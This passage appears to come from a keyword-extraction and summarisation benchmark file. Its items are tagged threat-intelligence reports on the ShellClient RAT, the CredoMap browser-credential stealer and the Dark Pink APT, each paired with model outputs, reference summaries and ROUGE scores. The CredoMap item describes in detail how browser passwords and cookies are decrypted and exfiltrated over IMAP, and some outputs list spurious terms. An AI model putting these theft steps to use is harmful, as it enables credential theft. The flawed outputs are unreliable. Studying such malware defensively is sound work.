DefenderBase64 encoding / decoding for data sent from / to C2Version [PERSON] V2.1 ( [DATE] December 2018)11/20Compiled [DATE] approximately [DATE] 2 [DATE] weeks after variant V1 , this variant keeps the same name and description attributes but shows further progress in development by adding a variety of new capabilities , including [ORG] FTP and [ORG] Telnet clients , AES encryption , self- update capabilities and more . This version of [ORG] ShellClient also communicates with the following C2 domain : azure.ms- tech[.]us:80Main Changes : Core functionalities : Implementing FTP and [ORG] Telnet clients AES encryption of data sent to the C2 Self - updating feature [GPE] Client ID and versioning attributes addedExtended set of predefined [CARDINAL] C2 commandsVariant V3.1 ( [DATE] January [DATE] 2019)About [DATE] a [DATE] month after the emergence of variant V2.1 , the V3.1 variant was seen in [DATE] January [DATE] of [DATE] 2019 . It has mostly minor changes in regards to functionality . The main difference is the removal of the \u201c Server \u201d component from the executable , as well as new code obfuscation and an upgraded commands menu . This version of [ORG] ShellClient also communicates with the following C2 domain : azure.ms - tech[.]us:80Main Changes : Core functionality : Removal of the Server component Introduction of command - line arguments [ORDINAL] First attempts of code obfuscation More predefined C2 commandsOS fingerprinting via [ORG] WMIVariant V4.0.0 ( [DATE] August [DATE] 2021)Perhaps [DATE] one of the biggest advancements in the [ORG] ShellClient evolution came with version V4.0.0 and continued with its successor V4.0.1 , in which the malware authors implemented many changes and improvements , adding new capabilities , enhancing code obfuscation and code protection using [ORG] Costura packer , as well as abandoning the [CARDINAL] C2 domain that was active since 2018.The traditional [CARDINAL] C2 communications were replaced with a [ORG] Dropbox built - in client , abusing the popular online platform to send commands to [ORG] ShellClient as well as storing the stolen data exfiltrated to a designated Dropbox account . This ultimately makes it harder to detect since the network traffic would appear legitimate to security analysts as well as most security solutions . Note : For full analysis of the variants , please refer to [ORG] Appendix [ORG] A in the IOCs popup in lower right of your screen . AttributionDuring the investigation , efforts were made to identify instances of the ShellClient code and to determine its origin or affiliation with known threat actors . Given the fact that ShellClient was previously undocumented and unknown at the time of the investigation , and the identity of the threat actor behind the attack was unclear , [ORG] the [ORG] Nocturnus [ORG] Team [ORDINAL] first attempted to find links to known adversary groups that have carried out similar attacks in the past against this industry and the affected regions . While some possible connections to known [NORP] Iranian threat actors were observed , our conclusion is that [ORG] MalKamak is a new and distinct activity group , with unique characteristics that distinguish it from the other known [NORP] Iranian threat actors . In publishing this data , it is hoped that more attention will be given to this threat and over time more information about ShellClient origins will emerge.12/20Likely [ORG] Nation State - Sponsored [ORG] Threat [ORG] ActorThe current working assumption is that ShellClient was created and maintained by a nation - state sponsored threat actor , or [ORG] Advanced [ORG] Persistent [ORG] Threat ( [ORG] APT ) . The intrusions analyzed by [ORG] Cybereason suggest that the motivation is cyber espionage against a very small set of carefully selected targets . This is supported by the fact that there are very few samples found in the telemetry or in - the - wild since [DATE] 2018 , in contrast to commodity malware that can usually be found in abundance . In addition , the [ORG] PDB path that is embedded in some of the ShellClient samples suggests that this malware is part of a restricted or classified project that could be related to military or intelligence agency operations : E:\\Projects ( Confidential)\\07 - Reverse Shell\\ShellClientServer_HTTP.v2\\obj\\Release\\svchost.pdbRussian [PERSON] Turla [PERSON] Connection or a Yara False Positive?In examining some \u201c low hanging fruit , \u201d the [ORDINAL] first clue examined was a [ORG] Yara rule comment that appeared in [ORG] VirusTotal along with some of the older variants of [ORG] ShellClient . The [PERSON] Yara rule that was indicated is named APT_Turla_MSTCSS_Malware_Jun19_1 : [PERSON] Yara rule comment that appeared in [ORG] VirusTotalThe [ORG] Nocturnus [ORG] Team examined the possibility that the ShellClient malware might have been created by the [NORP] Russian [ORG] APT group [GPE] Turla . However , upon careful analysis of known [GPE] Turla malware , and even more specifically the ones indicated in a [NORP] Symantec report referenced in the [ORG] Yara rule , the team did not find any significant similarities or evidence that can tie Turla to ShellClient or the activity that was observed in the intrusion investigated . [ORG] An [ORG] Iranian [ORG] ConnectionGiven that most of the victims were located in [LOC] the [LOC] Middle [LOC] East region and considering the affected industries , the unique profile of the attacked organizations , as well as other characteristics related to the intrusion and the malware , the team also examined the possibility that an [NORP] Iranian state - sponsored threat actor might be behind the [ORG] Operation [ORG] GhostShell intrusions . The [LOC] Nocturnus team compared our observations with previous campaigns that were attributed to known [NORP] Iranian threat actors , and was able to point out some interesting similarities between [ORG] ShellClient and previously reported [NORP] Iranian malware and threat actors . However , at this point , our estimation is that this operation was carried out by a separate activity group , dubbed [ORG] MalKamak , which has its own distinct characteristics that distinguish it from the other groups . Nonetheless , we believe that highlighting the possible connections between various [NORP] Iranian threat actors could be beneficial . Whether such connection is a result of a direct collaboration among these threat actors is currently unknown . These connections can also be explained in other ways , which are less direct , for example - a cyber mercenary who codes for multiple threat actors - could also be a likely explanation that can account for some of these observed overlaps . Meet [PERSON] MalKamak : A New Iranian Threat Actor13/20MalKamak [FAC] Diamond [FAC] Model [FAC] SummaryUsing the famous diamond model of attribution , the [LOC] Nocturnus team was able to determine that the attacks were carried out by a new activity group , dubbed [ORG] MalKamak , which was unknown thus far and believed to be operating on behalf of [NORP] Iranian interests . Following is a quick summary of its main characteristics : [ORG] Country [ORG] of [ORG] Origin : [EVENT] Iran [EVENT] Years of Activity : Since at least 2018 Motivation : Cyber EspionageVictimology : Affected Regions : Predominantly [LOC] the [LOC] Middle [LOC] East , with victims in the [GPE] US , [LOC] Europe and [GPE] Russia . [ORG] Affected Industries : [ORG] Aerospace and [ORG] TelecommunicationsUnique [ORG] Tools : ShellClient ( evolving from a simple reverse shell to a complex RAT)Generic Tools : [ORG] SafetyKatz , [ORG] PAExec , ping , ipconfig , tasklist , net , and WinRAR.Known Infrastructure:2018 - [DATE] 2020 : ms - tech[.].us2021 : [ORG] DropBox C2*MalKamak is derived from [ORG] Kamak , the name of an ancient [NORP] Persian mythological creature thought responsible for droughts and spreading chaos . Similarities to Previous [PERSON] Chafer [PERSON] APT - Related [PERSON] CampaignsDuring the analysis , it was observed that there were some potentially interesting links and similarities to an [NORP] Iranian threat actor called [PERSON] Chafer [PERSON] APT ( also known as APT39 , ITG07 or [ORG] Remix [ORG] Kitten).The group has been active since [DATE] at [DATE] least [DATE] 2014 , and is believed to be linked to [ORG] the [ORG] Rana [ORG] Intelligence [ORG] Computing [ORG] Company , a [GPE] Teheran - based company , previously known to serve as a front company for [ORG] the [ORG] Iranian [ORG] Ministry [ORG] of [ORG] Intelligence [ORG] and [ORG] Security ( MOIS ) . [ORG] The [ORG] Chafer [ORG] APT is known to attack targets in [LOC] the [LOC] Middle [LOC] East as well as the [GPE] U.S. and Europe.14/20Examining past campaigns , such as the one analyzed in Bitdefender \u2019s [ORG] Chafer APT report , the team noticed interesting overlaps with observations in this investigation , as detailed in the following sections . Our current assessment is that while these overlaps are interesting , they are not enough to establish attribution with an adequate certainty . Credential DumpingChafer has been known to use the [ORG] SafetyKatz tool to harvest credentials from compromised endpoints . As mentioned previously in this report , there are indications that the threat actor analyzed here used the same tool . Obfuscated [PERSON] PersistenceIn both of the investigations , the threat actors maintained persistence by obfuscating the malware as legitimate Windows- related components on victims \u2019 systems . To achieve that , both operations used the Windows Defender Update name to disguise their activity : ShellClient Disguised Persistence Previous [PERSON] Chafer APT Disguised PersistenceWIndows Defender Update service [PERSON] Defender [PERSON] Update scheduled taskObfuscated PersistencePDBsExecutable in both of the operations were found to be compiled from similar paths , particularly containing the \u201c projects \u201d folder under a root drive : ShellClient PDB PathsChafer APT Disguised PersistenceD:\\projects\\07 - Reverse Shell\\ShellClientServer_HTTP\\obj\\Release\\svchost.pdbF:\\Projects\\94- 06\\RCE\\bin\\Release\\x64\\mas.pdbE:\\Projects ( Confidential)\\07 - Reverse Shell\\ShellClientServer_HTTP.v2\\obj\\Release\\svchost.pdbF:\\Projects\\94- 08\\XNet\\bin\\Release\\Win32\\XNet.pdbPDB [ORG] EvidenceSimilarities to [PERSON] Agrius [PERSON] APT - Related CampaignsAnother [NORP] Iranian threat actor that was examined is a relatively new activity group known as [PERSON] Agrius [PERSON] APT . The group has been known to attack mainly [NORP] Israeli organizations and companies , carrying out destructive operations under the guise of ransomware attacks . A report about Agrius attacks mentions a custom .NET backdoor called [ORG] IPsec [ORG] Helper . Although the [ORG] IPsec [ORG] Helper backdoor and [ORG] ShellClient are quite different , there were some interesting similarities in the coding style and naming conventions , which may indicate a link between the [CARDINAL] two malware and the possibility that they were authored by developers from the same or adjacent teams . These interesting code similarities could indicate a similar developer was also behind the [ORG] ShellClient , or at the very least indicate a person who had access to the code of the [CARDINAL] two malware . That being said , the TTPs and the intrusions conducted by Agrius seem very different than the TTPs and intrusions observed in [FAC] Operation [FAC] GhostShell - and therefore we concluded that it is unlikely that Agrius is behind this operation . Possible Coding Style OverlapWhen comparing the command parsing function of both [ORG] IPsec [ORG] Helper and [ORG] ShellClient , a similar code structure and logic can be seen:15/20Code similarities between [ORG] IPsec [ORG] Helper and [ORG] ShellClientNaming [ORG] ConventionsBoth [ORG] ShellClient and [ORG] IPsec [ORG] Helper use a similar naming convention for the classes used to launch the malware as a service:16/20Similarities between [ORG] ShellClient and [ORG] IPsec [ORG] Helper naming conventionsKill TechniquesBoth [PRODUCT] ShellClient and [ORG] IPsec [ORG] Helper use InstallUtil.exe in the self kill mechanism . When ShellClient receives a self kill command , It executes InstallUtil.exe in order to delete the service created and remove itself from the infected machine . When [ORG] IPsec [ORG] Helper receives a self kill command , it creates and executes a batch script named \u201c [PERSON] remover.bat \u201d . The script uses InstallUtil.exe to delete the service created for the malware . Data Decoding and EncryptionBoth ShellClient and [ORG] IPsec [ORG] Helper use [PERSON] Base64 and AES to encode and encrypt data sent to the C2 . In addition , both malware have a separate class for [PERSON] Base64 encoding and decoding , and for AES encryption and decryption : ShellClient and [ORG] IPsec [ORG] Helper data decoding and encryption similaritiesOther Similar FunctionsSome functions of [ORG] ShellClient , [ORG] IPsec [ORG] Helper and [GPE] Apostle malware are very similar , for example the [PRODUCT] Serialize function , which is found on all [CARDINAL] three malware variants.17/20ShellClient , [ORG] IPsech [ORG] Helper and Apostle malware similaritiesPossible Infrastructure ConnectionAnother interesting connection identified between these malware is based on past IP address resolutions of the domain used by [PRODUCT] ShellClient azure.ms - tech[.]us and a domain used by [ORG] IPsec [ORG] Helper whynooneistherefornoneofthem[.]com . Both of these to these [ORG] IP addresses in the past revealed a significant number of malicious domains that were used by [NORP] Iranian APTs . ConclusionIn the Operation GhostShell report , [ORG] the [ORG] Cybereason [ORG] Nocturnus and Incident Response Teams discovered a sophisticated new [ORG] Remote [ORG] Access [ORG] Trojan ( RAT ) dubbed ShellClient that was used in highly targeted attacks against a select few [ORG] Aerospace [ORG] and [ORG] Telecommunications companies mainly in [LOC] the [LOC] Middle [LOC] East , with other victims located in the [GPE] U.S. , [GPE] Russia and [LOC] Europe . Our current assessment is that the attacks were perpetrated by a newly discovered [NORP] Iranian activity group dubbed [ORG] MalKamak that has been operating since [DATE] at [DATE] least [DATE] 2018 and remained in the dark until now . The investigation into [ORG] Operation [ORG] GhostShell also revealed that ShellClient dates back to at least [DATE] 2018 , and has been continuously evolving ever since while successfully evading most security tools and remaining completely unknown . By studying the ShellClient development cycles , the researchers were able to observe how [ORG] ShellClient has morphed over time from a rather simple reverse shell to a sophisticated [ORG] RAT used to facilitate cyber espionage operations while remaining undetected . The most recent ShellClient versions observed in [FAC] Operation [FAC] GhostShell follow the trend of abusing cloud - based storage services , in this case the popular Dropbox service . The [ORG] ShellClient authors chose to abandon their previous C2 domain and replace the command and control mechanism of the malware with a more simple yet more stealthy [CARDINAL] C2 channel using [ORG] Dropbox to exfiltrate the stolen data as well as to send commands to the malware . This trend has been increasingly adopted by many threat actors due to its simplicity and the ability to effectively blend in with legitimate network traffic . It is the intention of the researchers that the information provided in the [ORG] Operation [ORG] GhostShell report will inspire further research regarding [ORG] ShellClient and the newly identified [ORG] MalKamak activity group , and that it will ultimately assist in shedding more light on this mysterious malware that was kept well - hidden for many years.18/20authorsTOM [PERSON] FAKTERMAN , THREAT RESEARCHERTom [PERSON] Fakterman , Cyber Security Analyst with [ORG] the [ORG] Cybereason [ORG] Nocturnus [ORG] Research [ORG] Team , specializes in protecting critical networks and incident response . [PERSON] Tom has experience in researching malware , computer forensics and developing scripts and tools for automated cyber investigations . [PERSON] DANIEL [PERSON] FRANK , SENIOR MALWARE RESEARCHERWith [DATE] a [DATE] decade in malware research , [ORG] Daniel uses his expertise with malware analysis and reverse engineering to understand [ORG] APT activity and commodity cybercrime attackers . Daniel has previously shared research at [ORG] RSA [ORG] Conference , [ORG] the [ORG] Microsoft [ORG] Digital [ORG] Crimes [ORG] Consortium , and [ORG] Rootcon . [PERSON] CHEN ERLICH , INCIDENT RESPONSE ENGINEERChen has [DATE] almost [DATE] a [DATE] decade of experience in [ORG] Threat [ORG] Intelligence [ORG] & [ORG] Research , Incident Response and Threat Hunting . Before joining to [PERSON] Cybereason , [PERSON] Chen spent [DATE] three [DATE] years dissecting APTs , investigating underground cybercriminal groups and discovering security vulnerabilities in known vendors . Previously , he served as a Security Researcher in the IDF.ASSAF [GPE] DAHAN , HEAD OF [ORG] THREAT [ORG] RESEARCHAssaf has over [DATE] 15 [DATE] years in the [ORG] InfoSec industry . He started his career in [ORG] the [ORG] Israeli [ORG] Military [ORG] 8200 [ORG] Cybersecurity unit where he developed extensive experience in offensive security . Later in his career he led [FAC] Red [FAC] Teams , developed penetration testing methodologies , and specialized in malware analysis and reverse engineering . INDICATORS OF COMPROMISEOpen the chatbot on the bottom right corner of your screen to access the [PERSON] Ghostshell IOCs and [ORG] Appendix [ORG] A.MITRE [ORG] ATT&CK BREAKDOWNExecutionPersistencePrivilege [ORG] EscalationDefense [ORG] EvasionCommand - line interfaceWindows [PRODUCT] ServiceValid [PRODUCT] AccountsObfuscated [PRODUCT] Files or Dumping19/20DiscoveryLateral [FAC] MovementCollectionCommand and [ORG] ControlExfiltrationSecurity [ORG] Software DiscoverySMB / Windows Admin SharesArchive Collected DataData EncodingSystem Information DiscoverySystem Network Configuration DiscoveryAbout the AuthorEncrypted ChannelExfiltration Over Web ServiceExfiltration Over C2 ChannelFile Transfer ProtocolsExfiltration Over Alternative ProtocolWeb ProtocolsCybereason [ORG] NocturnusThe [ORG] Cybereason [ORG] Nocturnus [ORG] Team has brought the world \u2019s brightest minds from the military , government intelligence , and enterprise security to uncover emerging threats across the globe . They specialize in analyzing new attack methodologies , reverse - engineering malware , and exposing unknown system vulnerabilities . [ORG] The [ORG] Cybereason [ORG] Nocturnus [ORG] Team was the [ORDINAL] first to release a vaccination for the [DATE] 2017 [ORG] NotPetya and Bad Rabbit cyberattacks . All Posts by Cybereason Nocturnus20/20", "generated_text": "The Cybereason Nocturnus; Incident Response Teams; Operation GhostShell; the Aerospace and Telecommunications industries; the Middle East; Russia; Europe; the Falklands; Iran; 2018; the ShellClient RAT; use; stealth; evade detection; Dropbox; command; control; Dropbox client; FBI; State; similarities; the other Iranian groups; Chafer APT; APT39; Agrius; the RAT; capabilities; encryption; the investigation; similarities; other Iranian state-sponsored APT actors; APT39; Agrius APT.", "ref_text": "<START-1>The PDF discusses Operation GhostShell, a cyberespionage campaign targeting aerospace and telecom firms that has been active since at least 2018. The threat actor is a newly identified Iranian group called MalKamak. The main malware utilized is a remote access trojan (RAT) named ShellClient that has been under continuous development since 2018. ShellClient has evolved from a simple reverse shell to a stealthy, modular RAT incorporating encryption, obfuscation, and command and control via Dropbox to blend in with legitimate traffic. Attacks begin with reconnaissance and malware installation. ShellClient gathers system info and exfiltrates sensitive documents and data to Dropbox accounts controlled by the attackers. Additional tools like credential dumpers, lateral movement utilities, and archiving software facilitate data theft and maintaining persistence. While connections exist to other Iranian groups like Chafer APT and Agrius APT, MalKamak appears to be a distinct threat actor targeting the Middle East and global aerospace/telecom companies specifically. The ongoing development of ShellClient and infrastructure links to Iran point to MalKamak being a cyber espionage unit with likely state sponsorship. Defenders are advised to monitor for the indicators of compromise provided and use the MITRE ATT&CK framework breakdown to check for MalKamak's tactics, techniques, and procedures on their networks. The research aims to bring visibility to this formerly unknown threat. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4862385321100917, "gpt3/lexical/rouge_rouge2": 0.12442396313364056, "gpt3/lexical/rouge_rougeL": 0.25688073394495414, "gpt3/lexical/rouge_rougeLsum": 0.25688073394495414, "gpt3_generated_text": ["In July 2021, the Cybereason Nocturnus and Incident Response Teams responded to Operation GhostShell, a targeted cyber espionage campaign aimed at the Aerospace and Telecommunications industries, primarily in the Middle East, with additional victims in the US, Russia, and Europe. The campaign utilized a previously undocumented and stealthy Remote Access Trojan (RAT) dubbed ShellClient, which has been under development since at least 2018 and has evaded antivirus tools. The investigation identified a new Iranian threat actor, MalKamak, with possible connections to other Iranian state-sponsored APT threat actors such as Chafer APT (APT39) and Agrius APT. The ShellClient RAT was found to be actively targeting organizations in the Middle East, US, Russia, and Europe, with a focus on Aerospace and Telecommunications industries, and has been utilizing cloud-based storage services for command and control (C2) to remain undetected. The authors of the ShellClient RAT have invested significant effort into making it stealthy and hard to detect, with recent versions using a Dropbox client for C2. The investigation also revealed the ShellClient RAT's modular structure and configuration, including the use of Costura to compress modules using zlib. The discovery of Operation GhostShell and the ShellClient RAT highlights the ongoing threat of cyber espionage and the evolving capabilities of threat actors, particularly in the context of Iranian state-sponsored APT groups."]}, {"split_name": "test", "sample_id": "test_87", "prompt_text": "Extract the keywords: securityscorecard.com /research / apt28s - stealer - called - credomap A Deep Dive Into the APT28 \u2019s stealer called CredoMapPrepared by : Vlad Pasca , Senior Malware & Threat AnalystExecutive summaryCredoMap is a stealer developed by [ORG] the [ORG] Russian APT28 / Sofacy / Fancy [ORG] Bear that was used to target users in [GPE] Ukraine in the context of the ongoing war between [GPE] Russia and [GPE] Ukraine . The malware was initially discovered by [ORG] Google and CERT - UA . The threat actor weaponized a document to exploit the [PRODUCT] Follina ( CVE-2022 - 30190 ) vulnerability that would result in downloading the .NET stealer . The malware aims to steal the credentials and cookies from [PERSON] Google [PERSON] Chrome , [ORG] Mozilla [ORG] Firefox , and [PERSON] Microsoft [PERSON] Edge . The data exfiltration is done by sending information to a possibly compromised [CARDINAL] C2 server via the [ORG] IMAP email the response from the server : Figure [CARDINAL] 3The binary performs the login operation and reads the response using the Read method : Figure [CARDINAL] 4It selects the [ORG] INBOX folder using the SELECT command and performs multiple function calls that steal the browsers \u2019 credentials and cookies : Figure 52/15Figure [CARDINAL] 6The sample verifies if the file \u201c \\Google\\Chrome\\User Data\\Default\\Network\\Cookies \u201d exists in the Local [PRODUCT] AppData folder by calling the [ORG] File . Exists function : Figure 7The File . Copy method is used to copy the above file to a new file called \u201c cc\u201d:Figure 8The malicious binary opens a connection to the [LOC] Cookies database and executes an [ORG] SQL query that extracts some fields : Figure [CARDINAL] 9The process opens and reads the file called \u201c Local / [WORK_OF_ART] Google / [WORK_OF_ART] Chrome / User [WORK_OF_ART] Data / Local [WORK_OF_ART] State \u201d using [ORG] File . ReadAllText . It extracts the Base64 - encoded random key that is encrypted with DPAPI from JSON([\u201cos_crypt\u201d][\u201cencrypted_key \u201d ] ) . The key is Base64 - decoded and decrypted via a function call to [ORG] ProtectedData . Unprotect : Figure [CARDINAL] 103/15The binary creates an [ORG] AESEngine object , an [NORP] AEADParameters object containing the decrypted AES-128 key and the nonce ( [CARDINAL] 12 bytes ) , and calls the GcmBlockCipher . Init function with a \u201c False \u201d parameter ( decryption operation):Figure 11The \u201c encrypted_value \u201d extracted from the [LOC] Cookies database is decrypted using the [ORG] ProcessBytes and DoFinal methods : Figure [CARDINAL] 12The resulting values are stored in a dictionary that has the keys as \" host_key \" with values \" name= < Decrypted encrypted_value > ; \u201d , as highlighted in the figure below . Figure [CARDINAL] 13Finally , the process serializes the dictionary to a JSON string using [ORG] JsonConvert . SerializeObject : Figure [CARDINAL] 14The data exfiltration occurs by issuing a valid IMAP APPEND command . The \u201c From \u201d field is set to the username obtained from the Environment . UserName property , the \u201c Subject \u201d field is set to the current4/15date and time on the computer obtained from the [ORG] DateTime . UtcNow property , and the JSON string is also included in the command ( see figure [CARDINAL] 15).Figure 15The malware verifies if the file \u201c [WORK_OF_ART] \\Google\\Chrome\\User [WORK_OF_ART] Data\\Default\\Login [WORK_OF_ART] Data \u201d exists in the Local [PRODUCT] AppData folder using [ORG] File . Exists : Figure 16The File . Copy function is utilized to copy the above file to a new file called \u201c cp\u201d:Figure [CARDINAL] 17The binary opens a connection to the [ORG] Login [ORG] Data database and executes an [ORG] SQL query that extracts the \u201c action_url \u201d , \u201c username_value \u201d , and \u201c password_value \u201d fields : Figure [CARDINAL] 185/15The malicious process reads the file \u201c Local / [WORK_OF_ART] Google / [WORK_OF_ART] Chrome / User [WORK_OF_ART] Data / Local [WORK_OF_ART] State \u201d found in the [ORG] AppData directory and deserializes it using the [ORG] JsonConvert . DeserializeObject method : Figure [CARDINAL] 19Figure 20The sample extracts the Base64 - encoded random key that is encrypted with DPAPI from [ \u201c os_crypt \u201d ] [ \u201c encrypted_key \u201d ] . The key is Base64 - decoded and decrypted via a function call to [ORG] ProtectedData . Unprotect : Figure [CARDINAL] 21The encrypted \u201c password_value \u201d field is decrypted using a function that will be explained below : Figure 22The first [CARDINAL] 12 bytes after skipping [CARDINAL] 3 bytes ( version tag ) from \u201c password_value \u201d represent the [ORG] AES nonce , and the rest of the information is the ciphertext , as displayed in the figure below.6/15Figure [CARDINAL] 23As in the [ORDINAL] first case , the \u201c password_value \u201d field is decrypted by calling the [ORG] ProcessBytes and [ORG] DoFinal functions : Figure [ORDINAL] 24However , not all the passwords might be encrypted using AES - GCM . In the case of older versions of [ORG] Chrome , the threat actor tries to decrypt the passwords using the [ORG] ProtectedData . Unprotect API : Figure [CARDINAL] 25As we can see in figure [CARDINAL] 26 , the process computes a string containing \" action_url \" , \" username_value \" , and the decrypted \u201c password_value \u201d field that was obtained using the [ORDINAL] 1st method of decryption or the [ORDINAL] 2nd method of decryption , respectively:7/15Figure 26The credentials exfiltration occurs , in the same way , using an [NORP] IMAP command to the C2 server . The binary checks if the directory \u201c Mozilla\\Firefox\\Profiles\\ \u201d can be located in the [ORG] AppData folder ( see figure [CARDINAL] 27).Figure 27The malware is looking for a file called \u201c cookies.sqlite \u201d in the profile folders . The \u201c cookies.sqlite \u201d database is copied to a file called \u201c fc\u201d:Figure 28The sample runs the \" SELECT * FROM moz_cookies \" [ORG] SQL query to retrieve the Firefox cookies:8/15Figure 29A new dictionary is created having the keys as \u201c host \u201d with values \u201c name = value ; \u201d , as shown in the figure below . Figure 30The dictionary is serialized to JSON and will be exfiltrated via [PERSON] IMAP.The executable verifies if the following files can be identified in the profile folders : logins.jsonkey4.dbcert9.dbsignons.sqlitekey3.dbcert8.dbFigure 319/15If any of the above files exist , it is copied to the current directory , and its content is encoded using [FAC] Base64 . The file location and the Base64 - encoded content are exfiltrated using the [ORG] IMAP protocol . Finally , the newly created files are deleted using [ORG] File . Delete : Figure [CARDINAL] 32The File . Exists function is used to check if the file \u201c \\Microsoft\\Edge\\User [CARDINAL] Data\\Default\\Login Data \u201d exists in the Local AppData directory : Figure 33The above file is copied to a new file called \u201c ep \u201d , as highlighted in figure 34.Figure 34The sample executes the following [ORG] SQL query that extracts usernames and encrypted passwords from the \u201c logins \u201d table : Figure [CARDINAL] 35The \u201c password_value \u201d field is decrypted by calling the decrypt function that was also used to decrypt the [FAC] Chrome credentials:10/15Figure [CARDINAL] 36In the case of older versions of [ORG] Microsoft [ORG] Edge , the process tries to decrypt the passwords using the [ORG] ProtectedData . Unprotect function : Figure [CARDINAL] 37The malware creates a string containing \" action_url \" , \" username_value \" , and the decrypted \u201c password_value \u201d field that was obtained using [CARDINAL] one of the [CARDINAL] two decryption methods : Figure 38The executable verifies if the file \u201c \\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies \u201d can be found in the Local [PRODUCT] AppData folder ( see figure [CARDINAL] 39).Figure [CARDINAL] 39File . Copy is used to copy the above file to a file called \u201c ec\u201d:11/15Figure 40The following [ORG] SQL query is run by the malware , which extracts some fields from the \u201c cookies \u201d table : Figure 41The binary extracts the Base64 - encoded key that was encrypted with DPAPI from \u201c % LocalApplicationData%\\Microsoft\\Edge\\User Data\\Local [ORG] State \u201d . The key is decrypted via a function call to [ORG] ProtectedData . Unprotect : Figure 42The \u201c encrypted_value \u201d field is decrypted using the [ORG] AES key extracted above by calling the [ORG] ProcessBytes and DoFinal methods : Figure [CARDINAL] 43The function result is a dictionary containing the relevant information that is serialized using [ORG] JsonConvert . SerializeObject:12/15Figure 44All the files that were copied to the current directory are deleted using the [ORG] File . Delete function : Figure 45The malicious process sets Normal attributes for a file called \u201c SQLite.Interop.dll , \u201d which [GPE] Malwarebytes found that it \u2019s downloaded from the [CARDINAL] C2 server along with the initial executable . The [ORG] DLL file is deleted using [ORG] File . Delete and another deletion function implemented by the malware : Figure [CARDINAL] 4613/15The implementation of the deletion function consists of creating a cmd.exe process that deletes the [ORG] DLL", "generated_text": "CredoMap; the Russian APT28/Sofacy/Fancy Bear; users; Ukraine; the context; the ongoing war; the malware; credentials; cookies; Google Chrome; Firefox; Microsoft Edge; the C2 server; IMAP APPEND command; the browser; the IMAP Email response; a compromised C2 server; the encryption; a dictionary; the cookies; the password; the credentials; the C2 server; the C2 server; the kernel; the BLOCK CLIENT; the attacker; C2 servers; the account; the attacker; the C2 server; the victim; the C2 server; the C2 server.", "ref_text": "<START-1>CredoMap is a malware stealer developed by the Russia-based threat actor APT28/Fancy Bear and used to target victims in Ukraine. CredoMap was spread via a document exploiting the Follina vulnerability to download the .NET stealer. The analysis found that CredoMap\u2019s process first obtains the path of the current executable file and then connects to port 143 (IMAP) on the hard-coded C2 server (162.241.216.236). It logs in using hardcoded credentials and reads the server's response. The malware uses IMAP email protocols to exfiltrate stolen data to a command and control server. The malicious binary creates a TcpClient object, gets read and write client streams, and then reads the response from the server. It selects the INBOX folder and performs multiple function calls to steal the browser\u2019s credentials and cookies. It decrypts credentials stored in the browsers using AES-GCM and DPAPI. Extracted credentials and cookies are serialized to JSON and sent to the C2 via IMAP APPEND commands masquerading as emails. Next, the malicious binary opens a connection to the Cookies database and executes a SQL query to extract some fields. It also opens and reads a file named \"Local/Google/Chrome/User Data/Local State\", extracts a Base64-encoded random key from it, and decrypts it using DPAPI. Finally, CredoMap stores the extracted information in a dictionary and exports it to IMAP via JSON serialization. Newly created files will be deleted using the File.Delete method. Indicators of compromise include the C2 IP, spawned cmd processes, and code strings found via reverse engineering. A YARA rule can detect the malware. The use of Follina, stealthy IMAP C2, and encryption shows sophisticated tradecraft by APT28 to stealthily steal and exfiltrate sensitive browser data from targets. <END-1>", "t5/keyword/hint_hit_precision": 0.0, "gpt3/lexical/rouge_rouge1": 0.4553990610328638, "gpt3/lexical/rouge_rouge2": 0.14622641509433962, "gpt3/lexical/rouge_rougeL": 0.22065727699530518, "gpt3/lexical/rouge_rougeLsum": 0.22065727699530518, "gpt3_generated_text": ["The article discusses a deep dive into a stealer called CredoMap, which is developed by the Russian APT28/Sofacy/Fancy Bear. The malware specifically targets users in Ukraine in the context of the ongoing war between Russia and Ukraine. It was discovered by Google and CERT-UA. CredoMap exploits a vulnerability to download the .NET stealer, which aims to steal credentials and cookies from Google Chrome, Mozilla Firefox, and Microsoft Edge. The stolen data is exfiltrated to a possibly compromised C2 server via IMAP email. The article provides detailed information on the malware's functionality, including the process of stealing credentials and cookies, encrypting the data, and exfiltrating it to the C2 server. The article also highlights the attacker's tactics, such as using multiple C2 servers and impersonating the victim's account."]}, {"split_name": "test", "sample_id": "test_88", "prompt_text": "Extract the keywords: [ORG] blog.group-ib.com /dark - pink - apt Dark Pink11.01.2023New APT hitting Asia - Pacific , [LOC] Europe that goes deeper and darkerAndrey PolovinkinAcknowledgementsWe would like to specifically thank [PERSON] Albert [PERSON] Priego , [PERSON] Malware [PERSON] Analyst at [ORG] Group - IB , for discovering the first Dark Pink attacks and for conducting the initial research into this particular threat actor . His efforts made a major contribution to this blog and for our future research into this [ORG] APT group . IntroductionCountries of the Asia - Pacific [LOC] region have long been the target of advanced persistent threat ( [ORG] APT ) groups . Earlier [ORG] Group - IB research found that this region has often been a \u201c key arena \u201d of [ORG] APT activity , and a mixture of nation - state threat actors from [GPE] China , [GPE] North [GPE] Korea , [GPE] Iran , and [GPE] Pakistan have been tied to a wave of attacks in the region . More often than not , the primary motive for [ORG] APT attacks in [LOC] the Asia - Pacific [LOC] ( APAC ) region is not financial gain , but rather espionage . [ORG] Group - IB continuously explores and analyzes the methods , tools , and tactics used by some of the world \u2019s most prominent [ORG] APT groups , such as APT41 , but how can large - scale companies and organizations protect1/26themselves when a new [ORG] APT group emerges , or , if an already existing [ORG] APT group begins to utilize a completely new toolkit . Enter Dark Pink . [PERSON] Dark [PERSON] Pink is the name given by [ORG] Group - IB to a new wave of [ORG] APT attacks that has struck the [ORG] APAC region . At the present time , [ORG] Group - IB can not attribute the campaign to any known threat actor , making it highly likely that [PERSON] Dark [PERSON] Pink is an entirely new [ORG] APT group . Bearing this in mind , we will refer to [PERSON] Dark [PERSON] Pink as an [ORG] APT group throughout the entirety of this text . The name [PERSON] Dark [PERSON] Pink was coined by forming a hybrid of some of the email addresses used by the threat actors during data exfiltration . The [ORG] APT group has also been termed [ORG] Saaiwc [ORG] Group by [NORP] Chinese cybersecurity researchers . There is evidence to suggest that Dark Pink began operations as early as [DATE] mid-2021 , although the group \u2019s activity surged in mid - to - late [DATE] 2022 . To date , [ORG] Group - IB \u2019s sector - leading [ORG] Threat [ORG] Intelligence uncovered [CARDINAL] seven confirmed attacks by [PERSON] Dark [PERSON] Pink . The bulk of the attacks were carried out against countries in the [ORG] APAC region , although the threat actors spread their wings and targeted [CARDINAL] one [NORP] European governmental ministry . The confirmed victims include [CARDINAL] 